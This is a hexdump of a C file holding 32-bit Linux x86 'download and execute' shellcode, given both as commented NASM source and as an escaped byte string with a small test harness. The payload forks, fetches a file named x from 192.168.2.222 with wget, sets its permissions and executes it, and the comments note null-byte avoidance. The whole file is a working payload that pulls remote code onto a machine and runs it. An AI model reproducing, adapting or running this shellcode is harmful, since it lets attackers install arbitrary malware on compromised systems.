00000000  2f 2a 0a 3b 20 46 69 6c  65 6e 61 6d 65 3a 20 64  |/*.; Filename: d|
00000010  6f 77 6e 6c 6f 61 64 65  78 65 63 2e 6e 61 73 6d  |ownloadexec.nasm|
00000020  0a 3b 20 41 75 74 68 6f  72 3a 20 44 61 6e 69 65  |.; Author: Danie|
00000030  6c 20 53 61 75 64 65 72  0a 3b 20 57 65 62 73 69  |l Sauder.; Websi|
00000040  74 65 3a 20 68 74 74 70  3a 2f 2f 67 6f 76 6f 6c  |te: http://govol|
00000050  75 74 69 6f 6e 2e 77 6f  72 64 70 72 65 73 73 2e  |ution.wordpress.|
00000060  63 6f 6d 2f 0a 3b 20 54  65 73 74 65 64 20 6f 6e  |com/.; Tested on|
00000070  3a 20 55 62 75 6e 74 75  20 31 32 2e 30 34 20 2f  |: Ubuntu 12.04 /|
00000080  20 33 32 42 69 74 0a 3b  20 4c 69 63 65 6e 73 65  | 32Bit.; License|
00000090  3a 20 68 74 74 70 3a 2f  2f 63 72 65 61 74 69 76  |: http://creativ|
000000a0  65 63 6f 6d 6d 6f 6e 73  2e 6f 72 67 2f 6c 69 63  |ecommons.org/lic|
000000b0  65 6e 73 65 73 2f 62 79  2d 73 61 2f 33 2e 30 2f  |enses/by-sa/3.0/|
000000c0  0a 0a 3b 20 53 68 65 6c  6c 63 6f 64 65 3a 0a 3b  |..; Shellcode:.;|
000000d0  20 2d 20 64 6f 77 6e 6c  6f 61 64 20 31 39 32 2e  | - download 192.|
000000e0  31 36 38 2e 32 2e 32 32  32 2f 78 20 77 69 74 68  |168.2.222/x with|
000000f0  20 77 67 65 74 0a 3b 20  2d 20 63 68 6d 6f 64 20  | wget.; - chmod |
00000100  78 0a 3b 20 2d 20 65 78  65 63 75 74 65 20 78 0a  |x.; - execute x.|
00000110  3b 20 2d 20 78 20 69 73  20 61 6e 20 65 78 65 63  |; - x is an exec|
00000120  75 74 61 62 6c 65 0a 3b  20 2d 20 6c 65 6e 67 74  |utable.; - lengt|
00000130  68 20 31 30 38 20 62 79  74 65 73 0a 0a 67 6c 6f  |h 108 bytes..glo|
00000140  62 61 6c 20 5f 73 74 61  72 74 0a 0a 73 65 63 74  |bal _start..sect|
00000150  69 6f 6e 20 2e 74 65 78  74 0a 0a 5f 73 74 61 72  |ion .text.._star|
00000160  74 3a 0a 0a 20 20 20 20  3b 66 6f 72 6b 0a 20 20  |t:..    ;fork.  |
00000170  20 20 78 6f 72 20 65 61  78 2c 65 61 78 0a 20 20  |  xor eax,eax.  |
00000180  20 20 6d 6f 76 20 61 6c  2c 30 78 32 0a 20 20 20  |  mov al,0x2.   |
00000190  20 69 6e 74 20 30 78 38  30 0a 20 20 20 20 78 6f  | int 0x80.    xo|
000001a0  72 20 65 62 78 2c 65 62  78 0a 20 20 20 20 63 6d  |r ebx,ebx.    cm|
000001b0  70 20 65 61 78 2c 65 62  78 0a 20 20 20 20 6a 7a  |p eax,ebx.    jz|
000001c0  20 63 68 69 6c 64 0a 20  20 0a 20 20 20 20 3b 77  | child.  .    ;w|
000001d0  61 69 74 28 4e 55 4c 4c  29 0a 20 20 20 20 78 6f  |ait(NULL).    xo|
000001e0  72 20 65 61 78 2c 65 61  78 0a 20 20 20 20 6d 6f  |r eax,eax.    mo|
000001f0  76 20 61 6c 2c 30 78 37  0a 20 20 20 20 69 6e 74  |v al,0x7.    int|
00000200  20 30 78 38 30 0a 20 20  20 20 20 20 20 20 0a 20  | 0x80.        . |
00000210  20 20 20 3b 63 68 6d 6f  64 20 78 0a 20 20 20 20  |   ;chmod x.    |
00000220  78 6f 72 20 65 63 78 2c  65 63 78 0a 20 20 20 20  |xor ecx,ecx.    |
00000230  78 6f 72 20 65 61 78 2c  20 65 61 78 0a 20 20 20  |xor eax, eax.   |
00000240  20 70 75 73 68 20 65 61  78 0a 20 20 20 20 6d 6f  | push eax.    mo|
00000250  76 20 61 6c 2c 20 30 78  66 0a 20 20 20 20 70 75  |v al, 0xf.    pu|
00000260  73 68 20 30 78 37 38 0a  20 20 20 20 6d 6f 76 20  |sh 0x78.    mov |
00000270  65 62 78 2c 20 65 73 70  0a 20 20 20 20 78 6f 72  |ebx, esp.    xor|
00000280  20 65 63 78 2c 20 65 63  78 0a 20 20 20 20 6d 6f  | ecx, ecx.    mo|
00000290  76 20 63 78 2c 20 30 78  31 66 66 0a 20 20 20 20  |v cx, 0x1ff.    |
000002a0  69 6e 74 20 30 78 38 30  0a 20 20 20 20 0a 20 20  |int 0x80.    .  |
000002b0  20 20 3b 65 78 65 63 20  78 0a 20 20 20 20 78 6f  |  ;exec x.    xo|
000002c0  72 20 65 61 78 2c 20 65  61 78 0a 20 20 20 20 70  |r eax, eax.    p|
000002d0  75 73 68 20 65 61 78 0a  20 20 20 20 70 75 73 68  |ush eax.    push|
000002e0  20 30 78 37 38 0a 20 20  20 20 6d 6f 76 20 65 62  | 0x78.    mov eb|
000002f0  78 2c 20 65 73 70 0a 20  20 20 20 70 75 73 68 20  |x, esp.    push |
00000300  65 61 78 0a 20 20 20 20  6d 6f 76 20 65 64 78 2c  |eax.    mov edx,|
00000310  20 65 73 70 0a 20 20 20  20 70 75 73 68 20 65 62  | esp.    push eb|
00000320  78 0a 20 20 20 20 6d 6f  76 20 65 63 78 2c 20 65  |x.    mov ecx, e|
00000330  73 70 0a 20 20 20 20 6d  6f 76 20 61 6c 2c 20 31  |sp.    mov al, 1|
00000340  31 0a 20 20 20 20 69 6e  74 20 30 78 38 30 0a 20  |1.    int 0x80. |
00000350  20 20 20 0a 63 68 69 6c  64 3a 0a 20 20 20 20 3b  |   .child:.    ;|
00000360  64 6f 77 6e 6c 6f 61 64  20 31 39 32 2e 31 36 38  |download 192.168|
00000370  2e 32 2e 32 32 32 2f 2f  78 20 77 69 74 68 20 77  |.2.222//x with w|
00000380  67 65 74 0a 20 20 20 20  70 75 73 68 20 30 78 62  |get.    push 0xb|
00000390  0a 20 20 20 20 70 6f 70  20 65 61 78 0a 20 20 20  |.    pop eax.   |
000003a0  20 63 64 71 0a 20 20 20  20 70 75 73 68 20 65 64  | cdq.    push ed|
000003b0  78 0a 20 20 20 20 0a 20  20 20 20 70 75 73 68 20  |x.    .    push |
000003c0  30 78 37 38 32 66 32 66  33 32 20 3b 32 2f 2f 78  |0x782f2f32 ;2//x|
000003d0  20 61 76 6f 69 64 20 6e  75 6c 6c 20 62 79 74 65  | avoid null byte|
000003e0  0a 20 20 20 20 70 75 73  68 20 30 78 33 32 33 32  |.    push 0x3232|
000003f0  32 65 33 32 20 3b 32 32  2e 32 0a 20 20 20 20 70  |2e32 ;22.2.    p|
00000400  75 73 68 20 30 78 32 65  33 38 33 36 33 31 20 3b  |ush 0x2e383631 ;|
00000410  2e 38 36 31 0a 20 20 20  20 70 75 73 68 20 30 78  |.861.    push 0x|
00000420  32 65 33 32 33 39 33 31  20 3b 2e 32 39 31 0a 20  |2e323931 ;.291. |
00000430  20 20 20 6d 6f 76 20 65  63 78 2c 65 73 70 0a 20  |   mov ecx,esp. |
00000440  20 20 20 70 75 73 68 20  65 64 78 0a 20 20 20 20  |   push edx.    |
00000450  0a 20 20 20 20 70 75 73  68 20 30 78 37 34 20 3b  |.    push 0x74 ;|
00000460  74 0a 20 20 20 20 70 75  73 68 20 30 78 36 35 36  |t.    push 0x656|
00000470  37 37 37 32 66 20 3b 65  67 77 2f 0a 20 20 20 20  |7772f ;egw/.    |
00000480  70 75 73 68 20 30 78 36  65 36 39 36 32 32 66 20  |push 0x6e69622f |
00000490  3b 6e 69 62 2f 0a 20 20  20 20 70 75 73 68 20 30  |;nib/.    push 0|
000004a0  78 37 32 37 33 37 35 32  66 20 3b 72 73 75 2f 0a  |x7273752f ;rsu/.|
000004b0  20 20 20 20 6d 6f 76 20  65 62 78 2c 65 73 70 0a  |    mov ebx,esp.|
000004c0  20 20 20 20 70 75 73 68  20 65 64 78 0a 20 20 20  |    push edx.   |
000004d0  20 70 75 73 68 20 65 63  78 0a 20 20 20 20 70 75  | push ecx.    pu|
000004e0  73 68 20 65 62 78 0a 20  20 20 20 6d 6f 76 20 65  |sh ebx.    mov e|
000004f0  63 78 2c 65 73 70 0a 20  20 20 20 69 6e 74 20 30  |cx,esp.    int 0|
00000500  78 38 30 0a 20 20 20 20  0a 2a 2f 0a 0a 23 69 6e  |x80.    .*/..#in|
00000510  63 6c 75 64 65 20 3c 73  74 64 69 6f 2e 68 3e 0a  |clude <stdio.h>.|
00000520  23 69 6e 63 6c 75 64 65  20 3c 73 74 72 69 6e 67  |#include <string|
00000530  2e 68 3e 0a 0a 75 6e 73  69 67 6e 65 64 20 63 68  |.h>..unsigned ch|
00000540  61 72 20 63 6f 64 65 5b  5d 20 3d 20 5c 0a 22 5c  |ar code[] = \."\|
00000550  78 33 31 5c 78 63 30 5c  78 62 30 5c 78 30 32 5c  |x31\xc0\xb0\x02\|
00000560  78 63 64 5c 78 38 30 5c  78 33 31 5c 78 64 62 5c  |xcd\x80\x31\xdb\|
00000570  78 33 39 5c 78 64 38 5c  78 37 34 5c 78 32 61 5c  |x39\xd8\x74\x2a\|
00000580  78 33 31 5c 78 63 30 5c  78 62 30 5c 78 30 37 5c  |x31\xc0\xb0\x07\|
00000590  78 63 64 5c 78 38 30 5c  78 33 31 5c 78 63 39 5c  |xcd\x80\x31\xc9\|
000005a0  78 33 31 5c 78 63 30 5c  78 35 30 5c 78 62 30 5c  |x31\xc0\x50\xb0\|
000005b0  78 30 66 5c 78 36 61 5c  78 37 38 5c 78 38 39 5c  |x0f\x6a\x78\x89\|
000005c0  78 65 33 5c 78 33 31 5c  78 63 39 5c 78 36 36 5c  |xe3\x31\xc9\x66\|
000005d0  78 62 39 5c 78 66 66 5c  78 30 31 5c 78 63 64 5c  |xb9\xff\x01\xcd\|
000005e0  78 38 30 5c 78 33 31 5c  78 63 30 5c 78 35 30 5c  |x80\x31\xc0\x50\|
000005f0  78 36 61 5c 78 37 38 5c  78 38 39 5c 78 65 33 5c  |x6a\x78\x89\xe3\|
00000600  78 35 30 5c 78 38 39 5c  78 65 32 5c 78 35 33 5c  |x50\x89\xe2\x53\|
00000610  78 38 39 5c 78 65 31 5c  78 62 30 5c 78 30 62 5c  |x89\xe1\xb0\x0b\|
00000620  78 63 64 5c 78 38 30 5c  78 36 61 5c 78 30 62 5c  |xcd\x80\x6a\x0b\|
00000630  78 35 38 5c 78 39 39 5c  78 35 32 5c 78 36 38 5c  |x58\x99\x52\x68\|
00000640  78 33 32 5c 78 32 66 5c  78 32 66 5c 78 37 38 5c  |x32\x2f\x2f\x78\|
00000650  78 36 38 5c 78 33 32 5c  78 32 65 5c 78 33 32 5c  |x68\x32\x2e\x32\|
00000660  78 33 32 5c 78 36 38 5c  78 33 31 5c 78 33 36 5c  |x32\x68\x31\x36\|
00000670  78 33 38 5c 78 32 65 5c  78 36 38 5c 78 33 31 5c  |x38\x2e\x68\x31\|
00000680  78 33 39 5c 78 33 32 5c  78 32 65 5c 78 38 39 5c  |x39\x32\x2e\x89\|
00000690  78 65 31 5c 78 35 32 5c  78 36 61 5c 78 37 34 5c  |xe1\x52\x6a\x74\|
000006a0  78 36 38 5c 78 32 66 5c  78 37 37 5c 78 36 37 5c  |x68\x2f\x77\x67\|
000006b0  78 36 35 5c 78 36 38 5c  78 32 66 5c 78 36 32 5c  |x65\x68\x2f\x62\|
000006c0  78 36 39 5c 78 36 65 5c  78 36 38 5c 78 32 66 5c  |x69\x6e\x68\x2f\|
000006d0  78 37 35 5c 78 37 33 5c  78 37 32 5c 78 38 39 5c  |x75\x73\x72\x89\|
000006e0  78 65 33 5c 78 35 32 5c  78 35 31 5c 78 35 33 5c  |xe3\x52\x51\x53\|
000006f0  78 38 39 5c 78 65 31 5c  78 63 64 5c 78 38 30 22  |x89\xe1\xcd\x80"|
00000700  3b 0a 0a 6d 61 69 6e 28  29 0a 7b 0a 20 20 20 20  |;..main().{.    |
00000710  70 72 69 6e 74 66 28 22  53 68 65 6c 6c 63 6f 64  |printf("Shellcod|
00000720  65 20 4c 65 6e 67 74 68  3a 20 20 25 64 5c 6e 22  |e Length:  %d\n"|
00000730  2c 20 73 74 72 6c 65 6e  28 63 6f 64 65 29 29 3b  |, strlen(code));|
00000740  0a 20 20 20 20 69 6e 74  20 28 2a 72 65 74 29 28  |.    int (*ret)(|
00000750  29 20 3d 20 28 69 6e 74  28 2a 29 28 29 29 63 6f  |) = (int(*)())co|
00000760  64 65 3b 0a 20 20 20 20  72 65 74 28 29 3b 0a 7d  |de;.    ret();.}|
00000770
